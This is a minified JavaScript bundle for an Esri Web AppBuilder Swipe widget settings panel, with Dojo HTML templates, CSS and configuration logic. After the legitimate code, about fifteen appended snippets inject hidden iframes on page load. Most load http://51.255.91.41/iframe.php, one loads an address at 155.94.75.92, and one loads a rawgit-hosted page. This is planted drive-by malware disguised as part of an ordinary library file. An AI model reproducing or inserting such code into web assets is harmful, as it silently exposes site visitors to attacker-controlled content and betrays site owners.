"url:dijit/templates/TreeNode.html":'\x3cdiv class\x3d"dijitTreeNode" role\x3d"presentation"\r\n\t\x3e\x3cdiv data-dojo-attach-point\x3d"rowNode" class\x3d"dijitTreeRow" role\x3d"presentation"\r\n\t\t\x3e\x3cspan data-dojo-attach-point\x3d"expandoNode" class\x3d"dijitInline dijitTreeExpando" role\x3d"presentation"\x3e\x3c/span\r\n\t\t\x3e\x3cspan data-dojo-attach-point\x3d"expandoNodeText" class\x3d"dijitExpandoText" role\x3d"presentation"\x3e\x3c/span\r\n\t\t\x3e\x3cspan data-dojo-attach-point\x3d"contentNode"\r\n\t\t\tclass\x3d"dijitTreeContent" role\x3d"presentation"\x3e\r\n\t\t\t\x3cspan role\x3d"presentation" class\x3d"dijitInline dijitIcon dijitTreeIcon" data-dojo-attach-point\x3d"iconNode"\x3e\x3c/span\r\n\t\t\t\x3e\x3cspan data-dojo-attach-point\x3d"labelNode,focusNode" class\x3d"dijitTreeLabel" role\x3d"treeitem"\r\n\t\t\t\t   tabindex\x3d"-1" aria-selected\x3d"false" id\x3d"${id}_label"\x3e\x3c/span\x3e\r\n\t\t\x3c/span\r\n\t\x3e\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"containerNode" class\x3d"dijitTreeNodeContainer" role\x3d"presentation"\r\n\t\t style\x3d"display: none;" aria-labelledby\x3d"${id}_label"\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:dijit/templates/Tree.html":'\x3cdiv role\x3d"tree"\x3e\r\n\t\x3cdiv class\x3d"dijitInline dijitTreeIndent" style\x3d"position: absolute; top: -9999px" data-dojo-attach-point\x3d"indentDetector"\x3e\x3c/div\x3e\r\n\t\x3cdiv class\x3d"dijitTreeExpando dijitTreeExpandoLoading" data-dojo-attach-point\x3d"rootLoadingIndicator"\x3e\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"containerNode" class\x3d"dijitTreeContainer" role\x3d"presentation"\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e\r\n',"url:widgets/Swipe/setting/Setting.html":'\x3cdiv style\x3d"width:100%;height:100%;"\x3e\r\n  \x3cdiv class\x3d"style-section"\x3e\r\n    \x3cspan class\x3d"style-text"\x3e${nls.styleText}\x3c/span\x3e\r\n    \x3cdiv class\x3d"style-items"\x3e\r\n      \x3cdiv class\x3d"style-item jimu-float-leading jimu-leading-margin2" data-dojo-attach-point\x3d"verticalNode"\x3e\r\n        \x3cdiv class\x3d"style-vertical style-item-image"\x3e\x3c/div\x3e\r\n        \x3cdiv data-dojo-type\x3d"jimu/dijit/RadioBtn" data-dojo-props\x3d"group:\'swipe\'"\x3e\x3c/div\x3e\r\n        \x3clabel\x3e${nls.vertical}\x3c/label\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"style-item jimu-float-leading jimu-leading-margin2" data-dojo-attach-point\x3d"horizontalNode"\x3e\r\n        \x3cdiv class\x3d"style-horizontal style-item-image"\x3e\x3c/div\x3e\r\n        \x3cdiv data-dojo-type\x3d"jimu/dijit/RadioBtn" data-dojo-props\x3d"group:\'swipe\'"\x3e\x3c/div\x3e\r\n        \x3clabel\x3e${nls.horizontal}\x3c/label\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"style-item jimu-float-leading jimu-leading-margin2" data-dojo-attach-point\x3d"scopeNode"\x3e\r\n        \x3cdiv class\x3d"style-scope style-item-image"\x3e\x3c/div\x3e\r\n        \x3cdiv data-dojo-type\x3d"jimu/dijit/RadioBtn" data-dojo-props\x3d"group:\'swipe\'"\x3e\x3c/div\x3e\r\n        \x3clabel\x3e${nls.scope}\x3c/label\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"layer-section"\x3e\r\n    \x3cspan class\x3d"layer-text"\x3e${nls.layersAvailable}\x3c/span\x3e\r\n    \x3cspan class\x3d"jimu-icon jimu-icon-error hide" data-dojo-attach-point\x3d"layersChooserError"\x3e\x3c/span\x3e\r\n    \x3cdiv class\x3d"layers-chooser" data-dojo-attach-point\x3d"layersChooser"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"layer-section"\x3e\r\n    \x3cspan class\x3d"layer-text" data-dojo-attach-point\x3d"layerTextNode"\x3e${nls.layerText}\x3c/span\x3e\r\n    \x3cdiv data-dojo-type\x3d"dijit/form/Select" style\x3d"width:100%;" data-dojo-attach-point\x3d"swipeLayers"\x3e\x3c/div\x3e\r\n    \x3clabel class\x3d"layer-hint"\x3e${nls.layerHint}\x3c/label\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"layer-section"\x3e\r\n    \x3cdiv class\x3d"layer-text" data-dojo-attach-point\x3d"isZoomNode"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Swipe/setting/css/style.css":".jimu-widget-swipe-setting{margin:0; padding:0; font-size:14px; color: #000;}.jimu-widget-swipe-setting .hide{display: none;}.jimu-widget-swipe-setting .transparent{visibility: hidden;}.jimu-widget-swipe-setting .style-text,.jimu-widget-swipe-setting .layer-text{font-weight: bold;}.jimu-widget-swipe-setting .style-section .style-items{margin-top: 15px; margin-bottom: 10px; overflow: hidden; font-size: 10px;}.jimu-widget-swipe-setting .style-section .style-item {text-align: center; color: #000; cursor: pointer;}.jimu-widget-swipe-setting .style-section .style-item label {font-size: 14px; vertical-align: middle;}.jimu-widget-swipe-setting .style-section .style-item:first-child{margin-left: 0;}.jimu-rtl .style-item:first-child {margin-left: 2em; margin-right: 0;}.jimu-widget-swipe-setting .style-section .style-item-image{position: relative; width: 226px; height: 150px; margin-bottom: 10px;}.jimu-widget-swipe-setting .layers-chooser{width: 100%; height: 130px; overflow-y: scroll; border: 1px solid #D7D7D7;}.jimu-widget-swipe-setting .layers-chooser .jimu-basic-layer-chooser-from-map {position: relative;}.jimu-widget-swipe-setting .layers-chooser .jimu-basic-layer-chooser-from-map .jimu-tree{position: relative !important;}.jimu-widget-swipe-setting .layers-chooser .jimu-basic-layer-chooser-from-map-lite .tree-root-ul{border: none;}.jimu-widget-swipe-setting .jimu-radio {width: 14px; height: 14px; vertical-align: middle;}.jimu-widget-swipe-setting .jimu-radio-inner{width: 8px; height: 8px;}.jimu-widget-swipe-setting .style-item .style-vertical{background: url(images/vertical.png);}.jimu-widget-swipe-setting .style-item .style-horizontal{background: url(images/horizontal.png);}.jimu-widget-swipe-setting .style-item .style-scope{background: url(images/scope.png);}.jimu-widget-swipe-setting .layer-text{margin: 20px 0 5px 0; display: inline-block;}.jimu-widget-swipe-setting .layer-hint{display: inline-block; margin-top: 5px; color: #a0acbf; font-size: 12px; font-style: italic;}.claro .jimu-widget-swipe-setting .dijitSelect {color: #7989a0; border-color: #d2dade;}.claro .jimu-widget-swipe-setting .dijitSelectHover,.claro .jimu-widget-swipe-setting .dijitSelectFocused {border-color: #759dc0;}.claro .jimu-widget-swipe-setting .dijitSelect .dijitButtonContents {border-style: none; background: #fafafc !important;}.claro .jimu-widget-swipe-setting .dijitSelect .dijitArrowButton {border-style: none; background: #fafafc !important;}.jimu-widget-swipe-setting .layer-section .jimu-icon-error{vertical-align: sub;}.jimu-widget-swipe-setting .layers-chooser.error {-webkit-animation: swipe-err-glow 800ms ease-out infinite alternate; -moz-animation: swipe-err-glow 800ms ease-out infinite alternate; -o-animation: swipe-err-glow 800ms ease-out infinite alternate; -ms-animation: swipe-err-glow 800ms ease-out infinite alternate; animation: swipe-err-glow 800ms ease-out infinite alternate; box-shadow: 0 0 3px rgba(255, 0, 0, .2), inset 0 0 3px rgba(255, 0, 0, .1), 0 2px 0 #FFF; outline: none;}@-webkit-keyframes swipe-err-glow {0% {border-color: rgb(179, 22, 22); box-shadow: 0 0 3px rgba(255, 0, 0, .2), inset 0 0 3px rgba(255, 0, 0, .1), 0 2px 0 #FFF;} 100% {border-color: #F00; box-shadow: 0 0 10px rgba(255, 0, 0, .6), inset 0 0 10px rgba(255, 0, 0, .4), 0 2px 0 #FFF;}}@-moz-keyframes swipe-err-glow {0% {border-color: rgb(179, 22, 22); box-shadow: 0 0 3px rgba(255, 0, 0, .2), inset 0 0 3px rgba(255, 0, 0, .1), 0 2px 0 #FFF;} 100% {border-color: #F00; box-shadow: 0 0 10px rgba(255, 0, 0, .6), inset 0 0 10px rgba(255, 0, 0, .4), 0 2px 0 #FFF;}}@-o-keyframes swipe-err-glow {0% {border-color: rgb(179, 22, 22); box-shadow: 0 0 3px rgba(255, 0, 0, .2), inset 0 0 3px rgba(255, 0, 0, .1), 0 2px 0 #FFF;} 100% {border-color: #F00; box-shadow: 0 0 10px rgba(255, 0, 0, .6), inset 0 0 10px rgba(255, 0, 0, .4), 0 2px 0 #FFF;}}@-ms-keyframes swipe-err-glow {0% {border-color: rgb(179, 22, 22); box-shadow: 0 0 3px rgba(255, 0, 0, .2), inset 0 0 3px rgba(255, 0, 0, .1), 0 2px 0 #FFF;} 100% {border-color: #F00; box-shadow: 0 0 10px rgba(255, 0, 0, .6), inset 0 0 10px rgba(255, 0, 0, .4), 0 2px 0 #FFF;}}@keyframes swipe-err-glow {0% {border-color: rgb(179, 22, 22); box-shadow: 0 0 3px rgba(255, 0, 0, .2), inset 0 0 3px rgba(255, 0, 0, .1), 0 2px 0 #FFF;} 100% {border-color:#F00; box-shadow: 0 0 10px rgba(255, 0, 0, .6), inset 0 0 10px rgba(255, 0, 0, .4), 0 2px 0 #FFF;}}",
"*now":function(h){h(['dojo/i18n!*preload*widgets/Swipe/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dijit/registry dojo/_base/lang dojo/_base/array dojo/on dojo/query dojo/_base/html dojo/Deferred jimu/LayerInfos/LayerInfos jimu/dijit/LoadingShelter jimu/dijit/LayerChooserFromMapLite jimu/dijit/CheckBox jimu/dijit/RadioBtn dijit/form/Select".split(" "),function(h,p,n,m,c,b,e,f,a,l,k,d,u,r){return h([p,n],{baseClass:"jimu-widget-swipe-setting",_selectedStyle:"",postCreate:function(){this.own(e(this.verticalNode,"click",
c.hitch(this,function(){this._selectItem("vertical")})));this.own(e(this.horizontalNode,"click",c.hitch(this,function(){this._selectItem("horizontal")})));this.own(e(this.scopeNode,"click",c.hitch(this,function(){this._selectItem("scope")})));this.shelter=new d({hidden:!0});this.shelter.placeAt(this.domNode);this.shelter.startup();this.shelter.show();this._getLayerInfoObj(this.map).then(c.hitch(this,function(){this._setDefaultLayerByState(this.config.layerState)}),function(a){console.log(a)}).always(c.hitch(this,
function(){this.shelter.hide()}));this.own(e(this.swipeLayers,"change",c.hitch(this,function(a){this.config.layer=a})));this.isZoomCheckBox=new r({label:this.nls.isZoom,checked:!1},this.isZoomNode)},startup:function(){this.inherited(arguments);this.setConfig(this.config)},getConfig:function(){if(this._checkIsError())return!1;this.config.style=this._selectedStyle;this.config.layer=this.swipeLayers.get("value");this.config.isZoom=this.isZoomCheckBox.getValue();this.config.layerState=this._layerChooserFromMap.getState();
return this.config},setConfig:function(d){this.config=d;this.config.style?this._selectItem(this.config.style):this._selectItem("vertical");this._layerChooserFromMap||(this._layerChooserFromMap=new u({showTables:!1,customFilter:c.hitch(this,function(a){var c=new l,d=k.getInstanceSync().getLayerInfoArrayOfWebmap();b.some(d,function(b){if(b.id===a.id)return!0},this)?a.isRootLayer()?c.resolve(!0):this.map.getLayer(a.id)?c.resolve(!0):c.resolve(!1):c.resolve(!1);return c}),layerState:this.config.layerState}),
this._layerChooserFromMap.placeAt(this.layersChooser),this._layerChooserFromMap.startup(),b.forEach(this.map.layerIds,function(b){var c=this.map.getLayer(b);!c.declaredClass||"esri.layers.ArcGISDynamicMapServiceLayer"!==c.declaredClass&&"esri.layers.ArcGISTiledMapServiceLayer"!==c.declaredClass||(b=this._layerChooserFromMap.getLayerAssociateDomNodesById(b))&&a.addClass(b.collapseIcon,"transparent")},this),this.own(e(this._layerChooserFromMap,"tree-click",c.hitch(this,function(){var a=this._layerChooserFromMap.getState();
this._setDefaultLayerByState(a);this._checkIsError()&&(this.swipeLayers.set("options",[{value:"",label:""}]),this.swipeLayers.reset())}))));d=this._getOptionsFromState(this.config.layerState);this._isSelectedLayerInOptions(d)&&this.swipeLayers.set("value",this.config.layer);!0===this.config.isZoom?this.isZoomCheckBox.setValue(!0):this.isZoomCheckBox.setValue(!1)},_getLayerInfoObj:function(a){return k.getInstance(a,a.itemInfo).then(c.hitch(this,function(a){this._layerInfosObj=a;a=this._layerInfosObj.getLayerInfoArray();
a=b.filter(a,c.hitch(this,function(a){if(!this._isNewAddedLayer(a))return!0}));a=b.map(a,function(a){return{label:a.title,value:a.id}});this.swipeLayers.set("options",a)}))},_selectItem:function(a){var b=null,c="";"scope"===a?(b=this.scopeNode,c=this.nls.spyglassText):(b="horizontal"===a?this.horizontalNode:this.verticalNode,c=this.nls.layerText);this.layerTextNode.innerHTML=c;m.byNode(f(".jimu-radio",b)[0]).check(!0);this._selectedStyle=a},_isSelectedLayerInOptions:function(a){for(var b=this.config.layer||
this.swipeLayers.getValue(),c=0,d=a.length;c<d;c++)if(a[c].value===b)return!0;return!1},_setDefaultLayerByState:function(a){"undefined"!==typeof a&&null!==a&&(a=this._getOptionsFromState(a),this.swipeLayers.set("options",a),this._isSelectedLayerInOptions(a)&&0!==a.length?this.swipeLayers.setValue(this.config.layer||this.swipeLayers.getValue()):this.swipeLayers.reset())},_getOptionsFromState:function(a){var b=[];if(!a)return b;for(var c in a)if(a.hasOwnProperty(c)&&!0===a[c].selected){var d=this._layerInfosObj.getLayerInfoById(c);
d&&!this._isNewAddedLayer(d)&&(d=d.title)&&b.push({value:c,label:d})}return b},_isNewAddedLayer:function(a){for(var b=this._layerInfosObj.getLayerInfoArrayOfWebmap(),c=0,d=b.length;c<d;c++)if(b[c].id===a.id)return!1;return!0},_checkIsError:function(){if(this._isLayersChooserStateEmpty())return this._setError(),!0;this._cleanError();return!1},_isLayersChooserStateEmpty:function(){return 0===this._getOptionsFromState(this._layerChooserFromMap.getState()).length?!0:!1},_setError:function(){a.addClass(this.layersChooser,
"error")},_cleanError:function(){a.removeClass(this.layersChooser,"error")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});